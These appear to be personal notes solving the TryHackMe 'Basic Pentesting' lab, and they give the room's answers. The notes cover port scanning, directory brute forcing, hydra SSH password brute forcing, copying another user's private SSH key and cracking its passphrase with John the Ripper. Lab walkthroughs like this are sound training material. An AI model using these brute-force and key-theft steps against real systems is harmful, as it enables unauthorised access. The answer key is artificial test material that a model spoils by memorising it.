
#HashCracking  #FreeRoom #CTF 

- https://tryhackme.com/room/basicpentestingjt 
- IP: `10.10.48.234`
- topics: brute forcing, hash cracking, service enumeration & Linux enumeration

Find the services exposed by the machine

- hint: use an nmap scan to look for the open ports
- `nmap -sS 10.10.48.234`
- `nmap -sC -sV -oN <IP>`
```
22/tcp    ssh
80/tcp    http
139/tcp   netbios
445/tcp   microsoft-ds
8009/tcp  ajp13
8080/tcp  http-proxy
```

- go to `http://10.10.48.234:80` 'undergoing maintenance', check source code, try `/dev` and see `Apache/2.4.18 Ubuntu Server`

What is the name of the hidden directory on the web server(enter name without /)?

- hint: use `dirsearch`/`dirbuster` to find the hidden directories.
- AttackBox has `dirb`  which finds hidden directories and files (attack vectors), wordlists `/usr/share/dirb/wordlists/common.txt`
- `dirb http://10.10.48.234 /usr/share/wordlists/common.txt` 
```
http://10.10.48.234/development
http://10.10.48.234/index.html
http://10.10.48.234/server-status
```

- `development`

go to the `http://10.10.48.234/development` and see a `/dev.txt` and `j.txt`
- `j.txt` mentions `/etc/shadow`
- `dev.txt` mentions SMB and Apache, users J and K
  
User brute-forcing to find the username & password

What is the username? 
- hint: what about using SMB to find a username?
- SMB is Windows `445/tcp   microsoft-ds`

from video: 
`jan`
`kay`

  
What is the password?
- What about using a tool like hydra to bruteforce?
- `hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.48.234`
- `armando`
  
What service do you use to access the server(answer in abbreviation in all caps)?
- hint: what command line utility is used for remote access?
- SSH

  
What is the name of the other user you found(all lower case)?
- `kay`

If you have found another user, what can you do with this information?
- hint: apart from a password, how else can a user access a machine?
- `ssh jan@10.10.48.234` : `armando`
- `ls -la` shows `.lesshst` denied permissions
- `kay` has file but all denied permissions

 `linpeas` 
 `/home/kay/.ssh/id_rsa`
 `cat id_rsa`
 `nano kay_id_rsa` 
 paste in `chmod 600` `ssh -i kay_id_rsa kay@<IP>` 
 need passphrase, use john the ripper

What is the final password you obtain?

from video `beeswax`
`ssh -i kay_id_rsa kay@<IP> `  `beeswax`
`cat pass.bak`
`heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

